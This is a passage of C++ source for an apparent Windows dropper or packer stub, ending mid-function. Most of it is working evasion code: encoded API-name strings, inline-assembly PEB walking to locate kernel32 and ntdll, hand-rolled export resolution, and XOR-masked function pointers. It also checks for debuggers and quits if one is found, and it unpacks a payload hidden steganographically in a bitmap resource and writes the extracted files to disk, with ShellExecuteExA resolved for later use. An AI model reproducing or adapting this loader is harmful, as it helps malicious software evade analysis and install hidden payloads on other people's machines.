#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <windows.h>

#include "swap.h"
static char *valuebytes=NULL;

#define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
#define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
template <char c> struct enc_a{ enum{ v=(char)low_byte( swapbytes[(uint8_t)c]) }; };
template <char c> struct enc_b{ enum{ v=(char)high_byte(swapbytes[(uint8_t)c]) }; };
#define eca(c)  enc_a<c>::v
#define ecb(c)  enc_b<c>::v
#define e1(s)  eca(s[0])        ,ecb( s[0])
#define e2(s)  e1(s) ,eca( s[1]),ecb( s[1])
#define e3(s)  e2(s) ,eca( s[2]),ecb( s[2])
#define e4(s)  e3(s) ,eca( s[3]),ecb( s[3])
#define e5(s)  e4(s) ,eca( s[4]),ecb( s[4])
#define e6(s)  e5(s) ,eca( s[5]),ecb( s[5])
#define e7(s)  e6(s) ,eca( s[6]),ecb( s[6])
#define e8(s)  e7(s) ,eca( s[7]),ecb( s[7])
#define e9(s)  e8(s) ,eca( s[8]),ecb( s[8])
#define e10(s) e9(s) ,eca( s[9]),ecb( s[9])
#define e11(s) e10(s),eca(s[10]),ecb(s[10])
#define e12(s) e11(s),eca(s[11]),ecb(s[11])
#define e13(s) e12(s),eca(s[12]),ecb(s[12])
#define e14(s) e13(s),eca(s[13]),ecb(s[13])
#define e15(s) e14(s),eca(s[14]),ecb(s[14])
#define e16(s) e15(s),eca(s[15]),ecb(s[15])
#define e17(s) e16(s),eca(s[16]),ecb(s[16])
#define e18(s) e17(s),eca(s[17]),ecb(s[17])
#define e19(s) e18(s),eca(s[18]),ecb(s[18])
#define e20(s) e19(s),eca(s[19]),ecb(s[19])
#define e21(s) e20(s),eca(s[20]),ecb(s[20])
#define e22(s) e21(s),eca(s[21]),ecb(s[21])
#define e23(s) e22(s),eca(s[22]),ecb(s[22])
#define e24(s) e23(s),eca(s[23]),ecb(s[23])
#define e25(s) e24(s),eca(s[24]),ecb(s[24])
#define e26(s) e25(s),eca(s[25]),ecb(s[25])
#define e27(s) e26(s),eca(s[26]),ecb(s[26])
#define e28(s) e27(s),eca(s[27]),ecb(s[27])
#define e29(s) e28(s),eca(s[28]),ecb(s[28])
#define e30(s) e29(s),eca(s[29]),ecb(s[29])
#define e31(s) e30(s),eca(s[30]),ecb(s[30])
#define e32(s) e31(s),eca(s[31]),ecb(s[31])
#define e33(s) e32(s),eca(s[32]),ecb(s[32])
#define e34(s) e33(s),eca(s[33]),ecb(s[33])
#define e35(s) e34(s),eca(s[34]),ecb(s[34])
#define e36(s) e35(s),eca(s[35]),ecb(s[35])
#define e37(s) e36(s),eca(s[36]),ecb(s[36])
#define e38(s) e37(s),eca(s[37]),ecb(s[37])
#define e39(s) e38(s),eca(s[38]),ecb(s[38])
#define e40(s) e39(s),eca(s[39]),ecb(s[39])
#define e41(s) e40(s),eca(s[40]),ecb(s[40])
#define e42(s) e41(s),eca(s[41]),ecb(s[41])
#define e43(s) e42(s),eca(s[42]),ecb(s[42])
#define e44(s) e43(s),eca(s[43]),ecb(s[43])
#define e45(s) e44(s),eca(s[44]),ecb(s[44])
#define e46(s) e45(s),eca(s[45]),ecb(s[45])
#define e47(s) e46(s),eca(s[46]),ecb(s[46])
#define e48(s) e47(s),eca(s[47]),ecb(s[47])
#define e49(s) e48(s),eca(s[48]),ecb(s[48])
#define e50(s) e49(s),eca(s[49]),ecb(s[49])
#define e51(s) e50(s),eca(s[50]),ecb(s[50])
#define e52(s) e51(s),eca(s[51]),ecb(s[51])
#define e53(s) e52(s),eca(s[52]),ecb(s[52])
#define e54(s) e53(s),eca(s[53]),ecb(s[53])
#define e55(s) e54(s),eca(s[54]),ecb(s[54])
#define _(s,i) {e##i(s),eca(0)  ,ecb(0), 0}
#define merge_bytes(lb,hb) ((lb-97)|((hb-97)<<4))
void __(const char *s,unsigned short l){
  uint8_t j=0;
  for(uint8_t i=0;i<l+1;i++){
    ((char *)s)[i]=valuebytes[merge_bytes(((char *)s)[j],((char *)s)[j+1])];
    j+=2;
  };
}
#define _s(n,s,l) const char n[]=_(s,l);__(n,l);

void *ppeb=NULL;
void dbg();
HINSTANCE huser32,hshell32,hgdi32,hkernel32,hntdll;

#define TIME_TYPE LARGE_INTEGER
#define GET_TIME(s) (QueryPerformanceCounter(&(s)))
#define GET_TIME_LAST_2BYTES(s) ((uint32_t)((s).QuadPart&0xffff))
#define GET_TIME_LAST_BIT(s) ((uint32_t)((s).QuadPart&1))
volatile uint32_t seed=0;
#define _f(f) ((void *)((uint32_t)f^seed))

inline double pi(uint32_t t){
  double p=0.0;
  double s=1.0;
  for(uint32_t i=0; i<t; i++){
    double k=8.0*i;
    p+=(4.0/(k+1)-2.0/(k+4)-1.0/(k+5)-1.0/(k+6))/s;
    s*=16.0;
  };
  return p;
}

uint32_t timeshift(){
  uint32_t offsets[]={1009,3109,9109,12109,24107,48109,96053};
  uint32_t i=0;
  TIME_TYPE sw;
  GET_TIME(sw);
  i=GET_TIME_LAST_2BYTES(sw);
  do{
    GET_TIME(sw);
    pi(offsets[(uint32_t)(GET_TIME_LAST_2BYTES(sw))%7]);
  }while(i--);
  GET_TIME(sw);
  return GET_TIME_LAST_BIT(sw);
}

uint32_t timebits(){
  uint32_t l=0;
  for(uint8_t i=0; i<32; i++){
    l<<=1;
    l|=timeshift();
  };
  return l;
}

typedef volatile HMODULE (WINAPI *LLA)(LPCSTR); LLA lla;
typedef volatile BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*); SEA sea;
typedef volatile HBITMAP (WINAPI *CBMP)(int,int,UINT,UINT,const VOID*); CBMP cbmp;
typedef volatile HDC (WINAPI *CCDC)(HDC); CCDC cdc;
typedef volatile BOOL (WINAPI *DDC)(HDC); DDC ddc;
typedef volatile BOOL (WINAPI *DOB)(HGDIOBJ); DOB dob;
typedef volatile int (WINAPI *GOA)(HANDLE,int,LPVOID); GOA goa;
typedef volatile BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD); BLT blt;
typedef volatile HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ); SOB sob;
typedef volatile HPEN (WINAPI *CRP)(int,int,COLORREF); CRP crp;
typedef volatile BOOL (WINAPI *LTO)(HDC,int,int); LTO lto;
typedef volatile BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT); MTE mte;
typedef volatile BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL); AWR awr;
typedef volatile HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT); BEP bep;
typedef volatile BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *); EPA epa;
typedef volatile BOOL (WINAPI *GCR)(HWND,LPRECT); GCR gcr;
typedef volatile HDC (WINAPI *GDC)(HWND); GDC gdc;
typedef volatile int (WINAPI *GSM)(int); GSM gsm;
typedef volatile BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL); IVR ivr;
typedef volatile BOOL (WINAPI *PIR)(const RECT *,POINT); PIR pir;
typedef volatile BOOL (WINAPI *RCP)(); RCP rcp;
typedef volatile int (WINAPI *RDC)(HWND,HDC); RDC rdc;
typedef volatile BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT); TMV tmv;
typedef volatile BOOL (WINAPI *UWI)(HWND); UWI uwi;
typedef volatile BOOL (WINAPI *FLIB)(HMODULE); FLIB flib;
typedef volatile UINT (WINAPI *RWMA)(LPCSTR); RWMA rwma;
typedef volatile LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM); SMA sma;
typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*); CLTAW cltaw;
typedef volatile NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW); RGV rgv;

inline uint16_t strlen_i(const char *src){
  uint16_t i=0;
  uint8_t *c=(uint8_t *)src;
  while(*c++ && i++!=0xffff);
  if(i==0xffff) i=0;
  return i;
};

/*
uint32_t __readfsdword(const uint32_t Offset){
    uint32_t value;
    __asm__ __volatile__("movl %%fs:%a[Offset], %k[value]" : [value] "=r" (value) : [Offset] "ir" (Offset));
    return value;
};
*/
void get_ppeb(){
  __asm__ volatile(
    "xor (%0),      %0\n\t"
    "mov %%fs:0x30, %0\n\t"
    : "=r"(ppeb));
};

/*
  PPEB pPeb=(PPEB)__readfsdword(0x30);
  PLDR_DATA_TABLE_ENTRY ldrDataTableEntry=CONTAINING_RECORD(pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink,
                                                            LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
  hkernel32=(HMODULE)ldrDataTableEntry->DllBase;
*/
void get_handles(){
  __asm__ volatile(
    "mov %2,        %0\n\t"
    "mov 0x0C(%0),  %0\n\t"
    "mov 0x14(%0),  %0\n\t"
    "mov (%0),      %0\n\t"
    "mov 0x10(%0),  %1\n\t"
    "mov (%0),      %0\n\t"
    "mov 0x10(%0),  %0\n\t"
    : "=r"(hkernel32), "=r" (hntdll) : "r" (ppeb));
};

void *gpa(HMODULE m,const char *f){
  ULONG_PTR moduleBase;
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS ntHeaders;
  PIMAGE_EXPORT_DIRECTORY eatDirectory;
  DWORD* eatFunctions;
  WORD* eatOrdinals;
  DWORD* eatNames;
  DWORD eatNameOffset;
	moduleBase=(ULONG_PTR)m;
  dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
	ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
	eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  eatFunctions=(DWORD*)(moduleBase+eatDirectory->AddressOfFunctions);
  eatOrdinals=(WORD*)(moduleBase+eatDirectory->AddressOfNameOrdinals);
  eatNames=(DWORD*)(moduleBase+eatDirectory->AddressOfNames);
  void *f_ptr=NULL;
  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
    eatNameOffset=eatNames[i];
    char *src=(char*)(moduleBase+eatNameOffset);
    char *dst=(char*)f;
    while(*src && *dst){
      if(*src!=*dst) break;
      src++;
      dst++;
    };
    if(*src==0 && *dst==0) f_ptr=(void *)(moduleBase+eatFunctions[eatOrdinals[i]]);
  };
  return f_ptr;
};

void *get_fn_ptr(HINSTANCE l,const char *f){
  void* p=NULL;
  if(l){
    p=gpa(l,f);
    p=_f(p);
    if(!p) ExitProcess(1);
    char *c=(char *)f;
    while(*c) *c++=0;
    return p;
  };
  ExitProcess(1);
};

HBITMAP hBitmap,hOldBitmap;
HDC hdc,hdcMem;
BITMAP bm;
HINSTANCE hI;
PAINTSTRUCT ps;
RECT rect,rc,rc_yes,rc_no;
HPEN hpen;
POINT mpos;
BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
TRACKMOUSEEVENT tme;
int dlg_ret=0;
bool inv=false;
uint8_t *image=NULL;

LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  switch(msg){
    case WM_CREATE:
      hBitmap=((CBMP)_f(cbmp))(506,191,1,32,image);
      ((GOA)_f(goa))(hBitmap,sizeof(BITMAP),&bm);
      hdc=((GDC)_f(gdc))(hWnd);
      hdcMem=((CCDC)_f(cdc))(hdc);
      hOldBitmap=(HBITMAP)((SOB)_f(sob))(hdcMem,hBitmap);
      hpen=((CRP)_f(crp))(PS_SOLID,8,RGB(39,39,39));
      ((RDC)_f(rdc))(hWnd,hdc);
      return 0;
    case WM_KEYDOWN:
      if(wParam==VK_ESCAPE||wParam=='N'||wParam=='n'){
        DestroyWindow(hWnd);
        return 0;
      }
      else{
        if(wParam=='Y'||wParam=='y'){
          dlg_ret=1;
          DestroyWindow(hWnd);
          return 0;
        };
      };
      break;
    case WM_LBUTTONDOWN:
      ((RCP)_f(rcp))();
      ((SMA)_f(sma))(hWnd,0xA1,2,0);
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      if(((PIR)_f(pir))(&rc_yes,mpos)){
        dlg_ret=1;
        DestroyWindow(hWnd);
        return 0;
      };
      if(((PIR)_f(pir))(&rc_no,mpos)){
        DestroyWindow(hWnd);
        return 0;
      };
      break;
    case WM_MOUSEMOVE:
      if(!mousetrack) mousetrack=((TMV)_f(tmv))(&tme);
      break;
    case WM_MOUSELEAVE:
      mousetrack=FALSE;
      if(mark_yes||mark_no) inv=true;
      mark_yes=FALSE;
      mark_no=FALSE;
      if(inv){
        ((IVR)_f(ivr))(hWnd,NULL,FALSE);
        ((UWI)_f(uwi))(hWnd);
        inv=false;
      };
      break;
    case WM_MOUSEHOVER:
      mousetrack=FALSE;
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      inv=false;
      if(((PIR)_f(pir))(&rc_yes,mpos)){
        if(!mark_yes){
          mark_yes=TRUE;
          inv=true;
        };
        if(mark_no){
          mark_no=FALSE;
          inv=true;
        };
      }
      else{
        if(((PIR)_f(pir))(&rc_no,mpos)){
          if(!mark_no){
            mark_no=TRUE;
            inv=true;
          };
          if(mark_yes){
            mark_yes=FALSE;
            inv=true;
          };
        }
        else{
          if(mark_yes||mark_no) inv=true;
          mark_no=FALSE;
          mark_yes=FALSE;
        };
      };
      if(inv){
        ((IVR)_f(ivr))(hWnd,NULL,FALSE);
        ((UWI)_f(uwi))(hWnd);
      };
      break;
    case WM_PAINT:
      hdc=((BEP)_f(bep))(hWnd,&ps);
      ((GCR)_f(gcr))(hWnd,&rect);
      ((BLT)_f(blt))(hdc,0,0,rect.right,rect.bottom,hdcMem,0,0,SRCCOPY);
      if(mark_yes){
        ((SOB)_f(sob))(hdc,hpen);
        ((MTE)_f(mte))(hdc,33,118,NULL);
        ((LTO)_f(lto))(hdc,53,138);
        ((LTO)_f(lto))(hdc,33,158);
        ((MTE)_f(mte))(hdc,220,118,NULL);
        ((LTO)_f(lto))(hdc,200,138);
        ((LTO)_f(lto))(hdc,220,158);
      };
      if(mark_no){
        ((SOB)_f(sob))(hdc,hpen);
        ((MTE)_f(mte))(hdc,286,118,NULL);
        ((LTO)_f(lto))(hdc,306,138);
        ((LTO)_f(lto))(hdc,286,158);
        ((MTE)_f(mte))(hdc,473,118,NULL);
        ((LTO)_f(lto))(hdc,453,138);
        ((LTO)_f(lto))(hdc,473,158);
      };
      ((EPA)_f(epa))(hWnd,&ps);
      break;
    case WM_DESTROY:
      PostQuitMessage(0);
      ((DDC)_f(ddc))(hdcMem);
      ((DOB)_f(dob))(hBitmap);
      ((DOB)_f(dob))(hOldBitmap);
      break;
  }
  return DefWindowProcA(hWnd,msg,wParam,lParam);
}

int dlg_window(HINSTANCE hInstance){
  hI=hInstance;
  WNDCLASS wc;
  wc.style=0;
  wc.lpfnWndProc=dlg_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=NULL;
  wc.hCursor=LoadCursorA(NULL,IDC_ARROW);
  wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
  _s(idc,"imgdlgclass",11);
  wc.lpszClassName=idc;
  wc.lpszMenuName=NULL;
  wc.cbClsExtra=0;
  wc.cbWndExtra=0;
  RegisterClassA(&wc);
  rc={0,0,506,191};
  rc_yes={19,104,234,175};
  rc_no={272,104,487,175};
  ((AWR)_f(awr))(&rc,WS_CAPTION|WS_SYSMENU, FALSE);
  int nWidth=rc.right-rc.left;
  int nHeight=rc.bottom-rc.top;
  int nX=(((GSM)_f(gsm))(SM_CXSCREEN)-nWidth)/2;
  int nY=(((GSM)_f(gsm))(SM_CYSCREEN)-nHeight)/2;
  if(nX<0) nX=0;
  if(nY<0) nY=0;
  tme.cbSize=sizeof(tme);
  tme.dwFlags=TME_HOVER|TME_LEAVE;
  tme.dwHoverTime=10;
  HWND hWnd=CreateWindowExA(WS_EX_COMPOSITED|WS_EX_TOOLWINDOW|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_CAPTION|WS_SYSMENU,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
  if(!hWnd){
     UnregisterClassA(wc.lpszClassName,hInstance);
     return 0;
  };
  tme.hwndTrack=hWnd;
  ShowWindow(hWnd,SW_SHOW);
  ((UWI)_f(uwi))(hWnd);
  MSG msg;
  while(GetMessageA(&msg,NULL,0,0)){
    DispatchMessageA(&msg);
    TranslateMessage(&msg);
  };
  UnregisterClassA(wc.lpszClassName, hInstance);
  return 0;
}

UINT null_msg;

LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  switch(msg){
    case WM_CREATE:
      ((SMA)_f(sma))(hWnd,null_msg,0,0);
      return 0;
    case WM_CLOSE:
    case WM_DESTROY:
    case WM_ENDSESSION:
      PostQuitMessage(0);
      break;
    default:
      if(msg==null_msg){
        dlg_window(0);
        PostQuitMessage(0);
      };
      break;
  }
  return DefWindowProcA(hWnd,msg,wParam,lParam);
};

void null_window(HINSTANCE hInstance){
  MSG msg;
  WNDCLASS wc;
  HWND hwnd;
  wc.style=wc.cbClsExtra=wc.cbWndExtra=0;
  wc.lpfnWndProc=null_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=wc.hCursor=NULL;
  wc.hbrBackground=NULL;
  wc.lpszMenuName=NULL;
  _s(clsn,"main",4);
  wc.lpszClassName=clsn;
  null_msg=((RWMA)_f(rwma))(wc.lpszClassName);
  if(!RegisterClassA(&wc)) return;
  hwnd=CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,0,0,hInstance,0);
  if(!hwnd){
     UnregisterClassA(wc.lpszClassName,hInstance);
     return;
  };
  while(GetMessageA(&msg,NULL,0,0)>0){
    DispatchMessageA(&msg);
  };
  UnregisterClassA(wc.lpszClassName,hInstance);
  return;
};

uint8_t read_shift=0;
uint8_t read_mask=0;
uint8_t *res;

uint8_t bytes2byte_raw(){
  uint8_t b=0;
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); b<<=2; res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  b|=(*res&0x03); res++; read_shift++;
  if(read_shift==3){ res++; read_shift=0; };
  return b;
};

uint8_t bytes2byte(){
  uint8_t b=bytes2byte_raw()^read_mask;
  read_mask=b;
  return b;
};

void bytes2uint(uint32_t &b){
  b=0;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte(); b<<=8;
  b|=bytes2byte();
};

#define LZ_BUF_SIZE 259
#define LZ_CAPACITY 24
#define LZ_MIN_MATCH 3

uint8_t flags;
uint8_t *cbuffer=NULL;
uint8_t *vocbuf=NULL;
uint32_t *frequency=NULL;
uint16_t buf_size;
uint16_t vocroot;
uint16_t offset;
uint16_t lenght;
uint16_t symbol;
uint32_t low;
uint32_t hlp;
uint32_t range;
uint32_t *fc;
char *lowp;
char *hlpp;
uint8_t *cpos;
uint8_t rle_flag;

uint32_t dptr;
uint32_t dsize;

uint8_t dgetc(){
  dbg();
  uint8_t s=0;
  if(dptr<dsize){
    s=bytes2byte();
    dptr++;
  };
  return s;
}

uint8_t rc32_getc(uint8_t *c){
  while((range<0x10000)||(hlp<low)){
    if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
      range=0x10000-(uint16_t)low;
    hlp<<=8;
    *hlpp=dgetc();
    if(dptr==dsize) return 0;
    low<<=8;
    range<<=8;
  };
  range/=*fc;
  uint32_t count=(hlp-low)/range;
  if(count>=*fc) return 1;
  symbol=0;
  uint16_t i,j=128;
  while(j){
    if(frequency[symbol]<=count) symbol+=j;
    else{
      if(symbol) symbol-=j;
      else break;
    };
    j>>=1;
  };
  if(frequency[symbol]>count&&symbol) symbol--;
  *c=(uint8_t)symbol;
  j=frequency[symbol++];
  low+=j*range;
  range*=frequency[symbol]-j;
  for(i=symbol;i<257;i++) frequency[i]++;
  if(*fc>0xffff){
    uint32_t *fp=frequency;
    frequency[0]>>=1;
    for(i=1;i<257;i++){
      if((frequency[i]>>=1)==*fp++) frequency[i]++;
    };
  };
  return 0;
}

uint8_t unpack_file(){
  uint16_t i;
  if(lenght){
    if(!rle_flag){
      symbol=vocbuf[offset++];
      vocbuf[vocroot++]=symbol;
    };
    lenght--;
  }
  else{
    if(flags==0){
      cpos=cbuffer;
      if(rc32_getc(cpos++)) return 1;
      flags=8;
      lenght=0;
      symbol=*cbuffer;
      for(i=0;i<flags;i++){
        if(symbol&0x80) lenght++;
        else lenght+=3;
        symbol<<=1;
      };
      for(i=lenght;i;i--)
        if(rc32_getc(cpos++)) return 1;
      cpos=cbuffer+1;
    };
    lenght=0;
    if(*cbuffer&0x80){
      symbol=*cpos;
      vocbuf[vocroot++]=*cpos;
    }
    else{
      lenght=*cpos+++LZ_MIN_MATCH+1;
      offset=*(uint16_t*)cpos++;
      if(offset==0x0100) return 1;
      if(offset<0x0100){
        rle_flag=1;
        symbol=offset;
        for(i=0;i<lenght;i++) vocbuf[vocroot++]=symbol;
        lenght--;
      }
      else{
        rle_flag=0;
        offset=0xffff+(uint16_t)(vocroot+LZ_BUF_SIZE)-offset;
        symbol=vocbuf[offset++];
        vocbuf[vocroot++]=symbol;
        lenght--;
      };
    };
    *cbuffer<<=1;
    cpos++;
    flags--;
  };
  return 0;
}

bool is_exists(const char *path){
  uint32_t a=(uint32_t)GetFileAttributes(path);
  return ((a!=INVALID_FILE_ATTRIBUTES) && (a&FILE_ATTRIBUTE_DIRECTORY));
};

void rmkdir(char *path,int depth){
  for(uint16_t i=depth;i<strlen_i(path);i++){
    if(path[i]=='/'){
      path[i]=0;
      if(!is_exists(path)){
        CreateDirectoryA(path,NULL);
        if(!is_exists(path)) return;
      };
      path[i]='/';
      depth=i+1;
      rmkdir(path,depth);
      break;
    };
  };
  return;
}

uint8_t read_packed_value(void *p,uint16_t s){
  for(uint16_t i=0;i<s;i++){
    if(unpack_file()) return 1;
    ((char *)p)[i]=(char)symbol;
  };
  return 0;
}

void init_unpack(const uint32_t data_size_in){
  dsize=data_size_in;
  dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
  offset=range=0xffffffff;
  lowp=&((char *)&low)[3];
  hlpp=&((char *)&hlp)[0];
  fc=&frequency[256];
  uint32_t i;
  for(i=0;i<257;i++) frequency[i]=i;
  for(i=0;i<0x10000;i++) vocbuf[i]=0xff;
  for(i=0;i<sizeof(uint32_t);i++){
    hlp<<=8;
    *hlpp=dgetc();
  }
};

void unarc(char *out){
  HANDLE o;
  DWORD w;
  uint32_t fl=0,i;
  char *t=(char *)&fl,fp[257],c;
  for(;;){
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    for(i=0;i<strlen_i(out);i++) fp[i]=out[i];
    fp[i]='/';
    if(read_packed_value(&fp[strlen_i(out)+1],fl)) break;
    if(dptr==dsize) break;
    fp[fl+strlen_i(out)+1]=0;
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    rmkdir(fp,0);
    o=CreateFileA(fp,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if(o!=INVALID_HANDLE_VALUE){
      for(i=0;i<fl;i++){
        if(unpack_file()) return;
        c=(char)symbol;
        WriteFile(o,&c,1,&w,NULL);
      };
      CloseHandle(o);
    };
  };
}

bool iswin10(){
  if(rgv){
    OSVERSIONINFOEXW osInfo;
    osInfo.dwOSVersionInfoSize=sizeof(osInfo);
    rgv(&osInfo);
    return (uint32_t)osInfo.dwMajorVersion>=10?true:false;
  };
  return false;
};

#define data_res 0x10
#define image_size 386584

uint8_t *load_res(uint32_t id){
  HRSRC res=FindResourceA(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
  if(res){
    HGLOBAL res_handle=LoadResource(NULL,res);
    if(res_handle) return (uint8_t*)LockResource(res_handle);
  };
  return NULL;
};

void free_mem(){
  if(cbuffer) LocalFree(cbuffer);
  if(frequency) LocalFree(frequency);
  if(vocbuf) LocalFree(vocbuf);
  if(valuebytes) LocalFree(valuebytes);
  if(image) LocalFree(image);
};

void dbg(){
  uint32_t pNtGlobalFlag,pFlags=0,pForceFlags=0;
  __asm__ volatile(
    "mov %3,        %0\n\t"
    "mov 0x68(%0),  %2\n\t"
    "mov 0x18(%0),  %0\n\t"
    "mov 0x40(%0),  %1\n\t"
    "mov 0x44(%0),  %0\n\t"
    : "=r"(pForceFlags), "=r"(pFlags), "=r"(pNtGlobalFlag) : "r" (ppeb));
  if((pNtGlobalFlag&0x70)||(pFlags&~HEAP_GROWABLE)||pForceFlags){
    free_mem();
    ExitProcess(1);
  };
  return;
};

void init(){
  get_ppeb();
  get_handles();
  res=(uint8_t *)(load_res(data_res)+54);
  if(res==NULL) ExitProcess(1);
  read_mask=bytes2byte_raw();
  uint32_t c=0;
  bytes2uint(c);
  valuebytes=(char *)LocalAlloc(LMEM_ZEROINIT,256);
  if(!valuebytes){ free_mem(); ExitProcess(1); };
  cbuffer=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,LZ_CAPACITY+1);
  if(!cbuffer){ free_mem(); ExitProcess(1); };
  frequency=(uint32_t *)LocalAlloc(LMEM_ZEROINIT,257*sizeof(uint32_t));
  if(!frequency){ free_mem(); ExitProcess(1); };
  vocbuf=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,0x10000);
  if(!vocbuf){ free_mem(); ExitProcess(1); };
  for(uint16_t i=0;i<c;i++) valuebytes[i]=bytes2byte();
  _s(dll_u,"User32",6);
  _s(dll_s,"Shell32",7);
  _s(dll_g,"Gdi32",5);
  _s(f0001,"CreateBitmap",12);
  _s(f0002,"CreateCompatibleDC",18);
  _s(f0003,"DeleteDC",8);
  _s(f0004,"DeleteObject",12);
  _s(f0005,"GetObjectA",10);
  _s(f0006,"ShellExecuteExA",15);
  _s(f0007,"FreeLibrary",11);
  _s(f0008,"BitBlt",6);
  _s(f0009,"SelectObject",12);
  _s(f0010,"CreatePen",9);
  _s(f0011,"LineTo",6);
  _s(f0012,"MoveToEx",8);
  _s(f0013,"AdjustWindowRect",16);
  _s(f0014,"BeginPaint",10);
  _s(f0015,"EndPaint",8);
  _s(f0016,"GetClientRect",13);
  _s(f0017,"GetDC",5);
  _s(f0018,"GetSystemMetrics",16);
  _s(f0019,"InvalidateRect",14);
  _s(f0020,"PtInRect",8);
  _s(f0021,"ReleaseCapture",14);
  _s(f0022,"ReleaseDC",9);
  _s(f0023,"TrackMouseEvent",15);
  _s(f0024,"UpdateWindow",12);
  _s(f0025,"LoadLibraryA",12);
  _s(f0026,"RegisterWindowMessageA",22);
  _s(f0027,"SendMessageA",12);
  _s(f0028,"CommandLineToArgvW",18);
  _s(f0029,"RtlGetVersion",13);
  seed=timebits();
  flib=(FLIB)get_fn_ptr(hkernel32,f0007);
  lla=(LLA)get_fn_ptr(hkernel32,f0025);
  hgdi32=((LLA)_f(lla))(dll_g);
  huser32=((LLA)_f(lla))(dll_u);
  hshell32=((LLA)_f(lla))(dll_s);
  rgv=(RGV)gpa(hntdll,f0029);
  if (!iswin10()) ExitProcess(0);
  awr=(AWR)get_fn_ptr(huser32,f0013);
  bep=(BEP)get_fn_ptr(huser32,f0014);
  epa=(EPA)get_fn_ptr(huser32,f0015);
  gcr=(GCR)get_fn_ptr(huser32,f0016);
  gdc=(GDC)get_fn_ptr(huser32,f0017);
  gsm=(GSM)get_fn_ptr(huser32,f0018);
  ivr=(IVR)get_fn_ptr(huser32,f0019);
  pir=(PIR)get_fn_ptr(huser32,f0020);
  rcp=(RCP)get_fn_ptr(huser32,f0021);
  rdc=(RDC)get_fn_ptr(huser32,f0022);
  tmv=(TMV)get_fn_ptr(huser32,f0023);
  uwi=(UWI)get_fn_ptr(huser32,f0024);
  rwma=(RWMA)get_fn_ptr(huser32,f0026);
  sma=(SMA)get_fn_ptr(huser32,f0027);
  cbmp=(CBMP)get_fn_ptr(hgdi32,f0001);
  cdc=(CCDC)get_fn_ptr(hgdi32,f0002);
  ddc=(DDC)get_fn_ptr(hgdi32,f0003);
  dob=(DOB)get_fn_ptr(hgdi32,f0004);
  goa=(GOA)get_fn_ptr(hgdi32,f0005);
  blt=(BLT)get_fn_ptr(hgdi32,f0008);
  sob=(SOB)get_fn_ptr(hgdi32,f0009);
  crp=(CRP)get_fn_ptr(hgdi32,f0010);
  lto=(LTO)get_fn_ptr(hgdi32,f0011);
  mte=(MTE)get_fn_ptr(hgdi32,f0012);
  sea=(SEA)get_fn_ptr(hshell32,f0006);
  cltaw=(CLTAW)get_fn_ptr(hshell32,f0028);
};

char *wchartocodepage(const wchar_t *src,UINT cp){
  char *c_buf=NULL;
  if(src){
    int ln=WideCharToMultiByte(cp,0,src,-1,NULL,0,NULL,NULL);
    if(ln){
      c_buf=(char *)LocalAlloc(LMEM_ZEROINIT,ln);
      if(c_buf){
        if(!WideCharToMultiByte(cp,0,src,-1,c_buf,ln,NULL,NULL)){
          LocalFree(c_buf);
          c_buf=NULL;
        };
      };
    };
  };
  return c_buf;
}

extern "C" void __stdcall start(){
  init();
  uint32_t res_size=0;
  image=(uint8_t*)LocalAlloc(LMEM_ZEROINIT,image_size);
  if(image){
    bytes2uint(res_size);
    init_unpack(res_size);
    for(uint32_t i=0;i<image_size;i++){
      if(unpack_file()) break;
      image[i]=(uint8_t)symbol;
      if(dptr==dsize) break;
    };
    int c=0;
    LPWSTR *argv=((CLTAW)_f(cltaw))(GetCommandLineW(),&c);
    if(argv){
      if(c>1){
